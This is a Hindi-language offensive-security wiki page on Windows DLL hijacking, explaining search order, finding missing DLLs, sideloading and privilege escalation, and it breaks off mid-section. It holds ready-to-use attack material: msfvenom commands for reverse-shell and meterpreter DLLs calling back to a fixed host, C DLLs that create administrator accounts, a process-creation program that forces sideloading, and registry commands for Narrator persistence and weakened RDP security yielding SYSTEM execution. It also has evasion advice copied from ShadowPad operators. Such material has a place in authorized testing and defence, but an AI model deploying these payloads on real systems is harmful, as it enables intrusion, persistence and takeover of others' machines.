# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## बुनियादी जानकारी

DLL Hijacking का मतलब एक भरोसेमंद एप्लिकेशन को एक malicious DLL लोड करने के लिए मजबूर करना है। इस शब्द में कई रणनीतियाँ शामिल हैं जैसे **DLL Spoofing, Injection, and Side-Loading**। इसे मुख्यतः code execution, persistence हासिल करने और कम सामान्य रूप से privilege escalation के लिए उपयोग किया जाता है। यहाँ भले ही ध्यान escalation पर है, पर hijacking की विधि उद्देश्य के अनुसार समान रहती है।

### सामान्य तकनीकें

कई तरीके DLL hijacking के लिए इस्तेमाल होते हैं, और उनकी प्रभावशीलता उस एप्लिकेशन के DLL लोडिंग स्ट्रैटेजी पर निर्भर करती है:

1. **DLL Replacement**: असली DLL को malicious वाले से बदलना, वैकल्पिक रूप से मूल DLL की कार्यक्षमता बनाए रखने के लिए DLL Proxying का उपयोग करना।
2. **DLL Search Order Hijacking**: malicious DLL को उस search path में रखना जो legitimate DLL से पहले खोजना शुरू करता है, ताकि एप्लिकेशन के search pattern का फायदा उठाया जा सके।
3. **Phantom DLL Hijacking**: ऐसे malicious DLL बनाना जिसे एप्लिकेशन लोड करे, जबकि वह अपेक्षित DLL सिस्टम में मौजूद नहीं है।
4. **DLL Redirection**: खोज पैरामीटर बदलना जैसे `%PATH%` या `.exe.manifest` / `.exe.local` फाइलों को संशोधित कर एप्लिकेशन को malicious DLL की ओर निर्देशित करना।
5. **WinSxS DLL Replacement**: WinSxS directory में legitimate DLL की जगह malicious कॉपी रखना, जो अक्सर DLL side-loading से जुड़ा होता है।
6. **Relative Path DLL Hijacking**: malicious DLL को user-controlled डायरेक्टरी में रखना जहाँ एप्लिकेशन की कॉपी रहती है, जो Binary Proxy Execution तकनीकों जैसा व्यवहार दिखाता है।

> [!TIP]
> DLL sideloading के ऊपर HTML staging, AES-CTR configs और .NET implants जैसी लेयरिंग वाली step-by-step chain देखने के लिए नीचे दिए workflow की समीक्षा करें।

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## गायब Dlls ढूँढना

सिस्टम के अंदर missing Dlls खोजने का सबसे सामान्य तरीका sysinternals से [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) चलाना है, और **निम्नलिखित 2 फ़िल्टर** सेट करना:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

और केवल **File System Activity** दिखाना:

![](<../../../images/image (153).png>)

यदि आप **missing dlls सामान्य रूप से** खोज रहे हैं तो इसे कुछ **seconds** तक चलने दें।\
यदि आप किसी specific executable के अंदर **missing dll** खोज रहे हैं तो आपको **एक और फ़िल्टर जैसे "Process Name" "contains" `<exec name>`** सेट करना चाहिए, उसे execute करें, और events capture करना रोक दें।

## Missing Dlls का शोषण

privilege escalation के लिए सबसे अच्छी संभावना यह है कि हम किसी ऐसी जगह पर एक dll लिख सकें जिसे privilege process लोड करने की कोशिश करेगा — ऐसी किसी जगह जहाँ वो dll उस original dll से पहले खोजा जाता है। इसलिए, हम किसी फ़ोल्डर में dll लिख पाएँगे जहाँ dll उस फ़ोल्डर से पहले खोजा जाता है जहाँ original dll है (एक अजीब मामला), या हम किसी ऐसे फ़ोल्डर में लिख सकेंगे जहाँ dll खोजा जाएगा और original dll किसी भी फ़ोल्डर में मौजूद नहीं है।

### Dll Search Order

[**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) में यह बताया गया है कि DLLs कैसे लोड होते हैं।

**Windows applications** DLLs के लिए कुछ pre-defined search paths का पालन करते हैं, एक विशेष क्रम के अनुसार। DLL hijacking तब होती है जब एक malicious DLL रणनीतिक रूप से इन डायरेक्टरीज़ में से किसी एक में रख दी जाती है ताकि वह असली DLL से पहले लोड हो जाए। इसका समाधान यह सुनिश्चित करना है कि एप्लिकेशन जिन DLLs की आवश्यकता बताता है उनके लिए absolute paths का उपयोग करे।

नीचे आप **32-bit** सिस्टमों पर **DLL search order** देख सकते हैं:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

यह SafeDllSearchMode सक्षम होने पर का **default** search order है। जब यह अक्षम होता है, तब current directory दूसरे स्थान पर आ जाता है। इस feature को disable करने के लिए, **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value बनाकर उसे 0 पर सेट करें (default enabled है)।

यदि [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) फ़ंक्शन को **LOAD_WITH_ALTERED_SEARCH_PATH** के साथ बुलाया जाता है तो search executable module की directory से शुरू होती है जिसे **LoadLibraryEx** लोड कर रहा होता है।

अंत में, ध्यान रखें कि **एक dll बस नाम के बजाय absolute path संकेत करके भी लोड किया जा सकता है**। उस स्थिति में वह dll केवल उस path में ही खोजा जाएगा (यदि उस dll की कोई dependencies हैं, तो उन्हें नाम से लोड किए जाने के रूप में खोजा जाएगा)।

अन्य तरीके भी हैं जिनसे search order को बदला जा सकता है पर इन्हें मैं यहाँ नहीं समझाऊँगा।

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

एक उन्नत तरीका जिससे नए बनाए गए process के DLL search path को deterministic तरीके से प्रभावित किया जा सकता है, वह है ntdll की native APIs के साथ process बनाते समय RTL_USER_PROCESS_PARAMETERS में DllPath field सेट करना। यहाँ attacker-controlled directory प्रदान करके, ऐसा target process जिसे imported DLL केवल नाम से resolve करना है (कोई absolute path नहीं और safe loading flags का उपयोग नहीं), उसे उस directory से malicious DLL लोड करने के लिए मजबूर किया जा सकता है।

मुख्य विचार
- RtlCreateProcessParametersEx के साथ process parameters बनाएं और custom DllPath प्रदान करें जो आपके control वाले फ़ोल्डर की ओर इशारा करे (उदा., वही directory जहाँ आपका dropper/unpacker रहता है)।
- RtlCreateUserProcess के साथ process बनाएं। जब target binary किसी DLL को नाम से resolve करेगा, तो loader resolution के दौरान इस सक्षम DllPath से परामर्श करेगा, जिससे भरोसेमंद sideloading संभव होगा, भले ही malicious DLL target EXE के साथ colocated न हो।

नोट्स/सीमाएँ
- यह केवल बनाए जा रहे child process को प्रभावित करता है; यह SetDllDirectory से अलग है, जो केवल current process को प्रभावित करता है।
- target को नाम से import करना चाहिए या LoadLibrary करना चाहिए (कोई absolute path नहीं और LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories का उपयोग नहीं हो रहा होना चाहिए)।
- KnownDLLs और hardcoded absolute paths को hijack नहीं किया जा सकता। Forwarded exports और SxS precedence बदल सकते हैं।

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

ऑपरेशनल उपयोग उदाहरण
- अपने DllPath डायरेक्टरी में एक malicious xmllite.dll रखें (जो आवश्यक फ़ंक्शन्स export कर रहा हो या असली को proxy कर रहा हो)।
- ऊपर बताई गई तकनीक का उपयोग करते हुए उस signed binary को लॉन्च करें जिसे नाम से xmllite.dll ढूँढने के लिए जाना जाता है। loader दिए गए DllPath के माध्यम से import को resolve करता है और आपका DLL sideload कर लेता है।

यह तकनीक वास्तविक दुनिया में multi-stage sideloading chains चलाने के लिए देखी गई है: एक प्रारंभिक लॉन्चर एक helper DLL गिराता है, जो फिर एक Microsoft-signed, hijackable binary स्पॉन करता है जिसमें एक custom DllPath होता है ताकि attacker’s DLL को staging directory से लोड करने पर मजबूर किया जा सके।


#### Windows docs से dll search order पर अपवाद

Windows दस्तावेज़ों में सामान्य DLL खोज क्रम के कुछ अपवाद नोट किए गए हैं:

- जब कोई **DLL जिसका नाम पहले से memory में लोड किसी DLL के समान हो** मिलती है, तो सिस्टम सामान्य खोज को बायपास कर देता है। इसके बजाय, यह redirection और एक manifest के लिए जाँच करता है, और फिर default के रूप में पहले से memory में मौजूद DLL को उपयोग करता है। **इस परिदृश्य में, सिस्टम DLL की खोज नहीं करता है**।
- उन मामलों में जहां DLL को वर्तमान Windows संस्करण के लिए एक **known DLL** के रूप में मान्यता प्राप्त है, सिस्टम अपने version के known DLL का उपयोग करेगा, साथ ही उसके किसी भी dependent DLLs का, **खोज प्रक्रिया को छोड़ते हुए**। रजिस्ट्री कुंजी **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** इन known DLLs की सूची रखती है।
- यदि किसी **DLL के dependencies** हैं, तो इन dependent DLLs की खोज उसी तरह की जाती है जैसे कि उन्हें केवल उनके **module names** द्वारा संकेत किया गया हो, चाहे प्रारंभिक DLL को पूर्ण path के माध्यम से पहचाना गया हो या नहीं।

### अधिकार बढ़ाना

**आवश्यकताएँ**:

- ऐसे process की पहचान करें जो अलग **privileges** पर काम कर रहा हो या करेगा (horizontal or lateral movement), और जिसमें **DLL** मौजूद नहीं है।
- सुनिश्चित करें कि किसी भी उस **directory** के लिए **write access** उपलब्ध हो जहाँ उस **DLL** की **खोज** की जाएगी। यह स्थान executable की डायरेक्टरी हो सकता है या system path के भीतर कोई डायरेक्टरी हो सकता है।

हाँ, आवश्यकताओं को ढूँढना जटिल हो सकता है क्योंकि **डिफ़ॉल्ट रूप से किसी privileged executable के पास DLL न होना थोड़ा असामान्य है** और system path फ़ोल्डर पर write permissions होना और भी **अधिक असामान्य** है (डिफ़ॉल्ट रूप से आप नहीं कर सकते)। लेकिन misconfigured वातावरण में यह संभव है.\
यदि आप भाग्यशाली हैं और आवश्यकताओं को पूरा कर रहे हैं, तो आप [UACME](https://github.com/hfiref0x/UACME) प्रोजेक्ट देख सकते हैं। भले ही प्रोजेक्ट का **main goal is bypass UAC** हो, वहां आप उस Windows version के लिए एक **PoC** या Dll hijaking का उदाहरण पा सकते हैं जिसे आप उपयोग कर सकते हैं (संभवतः केवल उस फ़ोल्डर के path को बदलकर जहाँ आपके पास write permissions हैं)।

ध्यान दें कि आप **किसी फ़ोल्डर में अपनी अनुमतियाँ जाँच सकते हैं** ऐसा करके:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
और **PATH के अंदर सभी फ़ोल्डरों की permissions की जाँच करें**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
आप एक executable की imports और एक dll की exports भी निम्न के साथ जाँच सकते हैं:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) will check if you have write permissions on any folder inside system PATH.\
अन्य उपयोगी automated tools जो इस vulnerability को खोजने में मदद करते हैं वे हैं **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ और _Write-HijackDll._

### Example

यदि आपको कोई exploitable scenario मिलता है, तो उसे सफलतापूर्वक exploit करने के लिए सबसे महत्वपूर्ण चीजों में से एक यह है कि आप **create a dll that exports at least all the functions the executable will import from it**. वैसे, ध्यान दें कि Dll Hijacking मददगार होता है [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) या [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** आप **how to create a valid dll** का एक उदाहरण इस dll hijacking स्टडी में पा सकते हैं जो execution के लिए dll hijacking पर केंद्रित है: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
इसके अलावा, in the **next sectio**n you can find some **basic dll codes** that might be useful as **templates** or to create a **dll with non required functions exported**.

## **Dlls बनाना और संकलित करना**

### **Dll Proxifying**

सिद्धांततः एक **Dll proxy** ऐसा Dll होता है जो लोड होने पर **execute your malicious code when loaded** करने में सक्षम होता है, और साथ ही **expose** और **work** करता है जैसा अपेक्षित है, यानी **relaying all the calls to the real library**.

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक meterpreter (x86) प्राप्त करें:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक उपयोगकर्ता बनाएं (x86 मैंने कोई x64 संस्करण नहीं देखा):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### अपना

ध्यान दें कि कई मामलों में आप जो Dll कंपाइल करते हैं उसे **export several functions** करना होगा जिन्हें victim process द्वारा लोड किया जाएगा; यदि ये functions मौजूद नहीं हैं तो **binary won't be able to load** उन्हें और **exploit will fail**।

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL उदाहरण — उपयोगकर्ता निर्माण के साथ</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>वैकल्पिक C DLL (thread entry के साथ)</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## केस स्टडी: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe अभी भी स्टार्ट पर एक पूर्वानुमेय, भाषा-विशिष्ट localization DLL को probe करता है जिसे hijacked करके arbitrary code execution और persistence हासिल किया जा सकता है।

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- यदि OneCore path पर एक writable attacker-controlled DLL मौजूद है, तो वह लोड हो जाता है और `DllMain(DLL_PROCESS_ATTACH)` execute होता है। No exports are required.

Discovery with Procmon
- फ़िल्टर: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator शुरू करें और ऊपर दिए गए पाथ के प्रयासित लोड का निरीक्षण करें।

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack UI पर बोलने/हाइलाइट करने लगेगा। चुप रहने के लिए, attach करते समय Narrator threads को enumerate करें, मुख्य थ्रेड को खोलें (`OpenThread(THREAD_SUSPEND_RESUME)`) और उसे `SuspendThread` करें; फिर अपनी खुद की थ्रेड में जारी रखें। पूरा कोड देखने के लिए PoC देखें।

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- ऊपर की सेटिंग के साथ, Narrator शुरू करने पर प्लांट किया गया DLL लोड हो जाता है। secure desktop (logon screen) पर CTRL+WIN+ENTER दबाकर Narrator शुरू करें; आपका DLL secure desktop पर SYSTEM के रूप में चलेगा।

RDP-triggered SYSTEM execution (lateral movement)
- classic RDP security layer allow करने के लिए: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- host पर RDP करें, logon screen पर CTRL+WIN+ENTER दबाकर Narrator लॉन्च करें; आपका DLL secure desktop पर SYSTEM के रूप में चलेगा।
- Execution तब रुक जाती है जब RDP session बंद हो जाती है—इंजेक्ट/माइग्रेट तुरंत करें।

Bring Your Own Accessibility (BYOA)
- आप किसी built-in Accessibility Tool (AT) registry entry (जैसे CursorIndicator) की क्लोन बना सकते हैं, उसे किसी arbitrary binary/DLL की ओर पॉइंट करने के लिए एडिट कर सकते हैं, उसे import कर सकते हैं, और फिर `configuration` को उस AT नाम पर सेट कर सकते हैं। इससे Accessibility framework के तहत arbitrary execution प्रोक्सी हो जाती है।

Notes
- `%windir%\System32` के अन्दर लिखना और HKLM मान बदलना admin अधिकार मांगता है।
- सभी payload लॉजिक `DLL_PROCESS_ATTACH` में रह सकती है; किसी exports की आवश्यकता नहीं है।

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

यह केस Lenovo के TrackPoint Quick Menu (`TPQMAssistant.exe`) में पाए गए **Phantom DLL Hijacking** को दर्शाता है, जिसे **CVE-2025-1729** के रूप में ट्रैक किया गया है।

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` स्थित है `C:\ProgramData\Lenovo\TPQM\Assistant\` पर।
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` रोज़ाना सुबह 9:30 बजे लॉग-ऑन यूज़र के context में चलती है।
- **Directory Permissions**: `CREATOR OWNER` द्वारा writable, जिससे लोकल यूज़र्स arbitrary फाइलें ड्रॉप कर सकते हैं।
- **DLL Search Behavior**: पहले अपनी working directory से `hostfxr.dll` लोड करने की कोशिश करता है और यदि गायब हो तो "NAME NOT FOUND" लॉग करता है — यह स्थानीय डायरेक्टरी की प्राथमिकता दर्शाता है।

### Exploit Implementation

एक attacker उसी डायरेक्टरी में एक malicious `hostfxr.dll` stub रख सकता है और मिसिंग DLL का फायदा उठाकर यूज़र के context में code execution प्राप्त कर सकता है:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### आक्रमण प्रवाह

1. एक सामान्य उपयोगकर्ता के रूप में, `hostfxr.dll` को `C:\ProgramData\Lenovo\TPQM\Assistant\` में डालें।
2. नियमित कार्य को वर्तमान उपयोगकर्ता के संदर्भ में 9:30 AM पर चलने का इंतजार करें।
3. यदि टास्क चलने पर कोई प्रशासक लॉग इन है, तो दुर्भावनापूर्ण DLL प्रशासक के सेशन में मध्यम integrity पर चलती है।
4. मानक UAC bypass तकनीकों का उपयोग कर मध्यम integrity से SYSTEM privileges तक उन्नयन करें।

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

हमलावर अक्सर MSI-based droppers को DLL side-loading के साथ जोड़ते हैं ताकि एक trusted, signed process के तहत payloads निष्पादित किए जा सकें।

Chain overview
- उपयोगकर्ता MSI डाउनलोड करता है। एक CustomAction GUI install के दौरान चुपचाप चलता है (उदा., LaunchApplication या VBScript action), और embedded resources से अगले चरण का पुनर्निर्माण करता है।
- Dropper एक वैध, signed EXE और एक दुर्भावनापूर्ण DLL को उसी डायरेक्टरी में लिखता है (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll)।
- जब signed EXE शुरू होता है, Windows DLL search order वर्किंग डायरेक्टरी से पहले wsc.dll लोड करता है, जिससे attacker कोड एक signed parent के तहत निष्पादित होता है (ATT&CK T1574.001)।

MSI analysis (what to look for)
- CustomAction table:
- ऐसे एंट्रियों को देखें जो executables या VBScript चलाते हैं। संदिग्ध पैटर्न का उदाहरण: LaunchApplication जो बैकग्राउंड में एक embedded file को execute कर रहा हो।
- Orca (Microsoft Orca.exe) में, CustomAction, InstallExecuteSequence and Binary tables की जांच करें।
- MSI CAB में embedded/split payloads:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- या lessmsi का उपयोग करें: lessmsi x package.msi C:\out
- ऐसे कई छोटे fragments देखें जो VBScript CustomAction द्वारा concatenated और decrypted किए जाते हैं। सामान्य प्रवाह:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
व्यावहारिक sideloading wsc_proxy.exe के साथ
- इन दोनों फ़ाइलों को एक ही फ़ोल्डर में रखें:
- wsc_proxy.exe: वैध साइन किए गए होस्ट (Avast). यह प्रोसेस अपनी डायरेक्टरी से नाम के आधार पर wsc.dll लोड करने का प्रयास करता है.
- wsc.dll: attacker DLL. यदि कोई विशिष्ट exports आवश्यक नहीं हैं तो DllMain पर्याप्त हो सकता है; अन्यथा, एक proxy DLL बनाएं और आवश्यक exports को वास्तविक लाइब्रेरी को फॉरवर्ड करें, साथ ही DllMain में payload चलाएँ.
- एक न्यूनतम DLL payload बनाएं:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- एक्सपोर्ट आवश्यकताओं के लिए, एक proxying framework (उदा., DLLirant/Spartacus) का उपयोग करके एक forwarding DLL जनरेट करें जो आपके payload को भी execute करे।

- यह तकनीक होस्ट बाइनरी द्वारा DLL नाम रिज़ॉल्यूशन पर निर्भर करती है। यदि होस्ट absolute paths या safe loading flags (उदा., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) का उपयोग करता है, तो hijack fail हो सकता है।
- KnownDLLs, SxS, और forwarded exports प्राथमिकता को प्रभावित कर सकते हैं और होस्ट बाइनरी तथा export सेट के चयन के दौरान इन्हें ध्यान में रखना चाहिए।

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point ने बताया कि Ink Dragon ShadowPad को एक **three-file triad** का उपयोग करके कैसे डिप्लॉय करता है ताकि यह वैध सॉफ़्टवेयर में घुल-मिल जाए और कोर payload डिस्क पर encrypted रहे:

1. **Signed host EXE** – vendors जैसे AMD, Realtek, या NVIDIA का दुरुपयोग किया जाता है (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). हमलावर executable का नाम बदल देते हैं ताकि वह Windows binary जैसा दिखे (उदा. `conhost.exe`), पर Authenticode signature वैध बनी रहती है।
2. **Malicious loader DLL** – EXE के बगल में अपेक्षित नाम के साथ drop किया जाता है (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). यह DLL आम तौर पर एक MFC binary होता है जिसे ScatterBrain framework से obfuscate किया जाता है; इसका काम encrypted blob को ढूँढना, उसे decrypt करना, और ShadowPad को reflectively map करना होता है।
3. **Encrypted payload blob** – अक्सर उसी directory में `<name>.tmp` के रूप में स्टोर रहता है। decrypted payload को memory-map करने के बाद loader TMP फाइल को delete कर देता है ताकि forensic evidence नष्ट हो जाए।

Tradecraft नोट्स:

* Signed EXE का नाम बदलने (जबकि PE header में मूल `OriginalFileName` रखा रहता है) इसे Windows binary के रूप में छिपने देता है पर vendor signature बरकरार रहती है, इसलिए Ink Dragon की आदत को दोहराएँ — `conhost.exe` जैसा दिखने वाले बाइनरी डालें जो वास्तव में AMD/NVIDIA utilities हों।
* क्योंकि executable trusted रहता है, अधिकांश allowlisting नियंत्रणों के लिए बस आपका malicious DLL उसके साथ होना ही पर्याप्त होता है। loader DLL को कस्टमाइज़ करने पर ध्यान दें; signed parent सामान्यतः बिना परिवर्तन के चल सकता है।
* ShadowPad का decryptor अपेक्षा करता है कि TMP blob loader के बगल में हो और writable हो ताकि mapping के बाद वह फाइल को zero कर सके। payload के लोड होने तक डायरेक्टरी writable रखें; एक बार memory में होने पर TMP फाइल OPSEC के लिए सुरक्षित रूप से delete की जा सकती है।

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators DLL sideloading को LOLBAS के साथ जोड़ते हैं ताकि डिस्क पर एकमात्र कस्टम आर्टिफैक्ट trusted EXE के बगल में मौजूद malicious DLL ही हो:

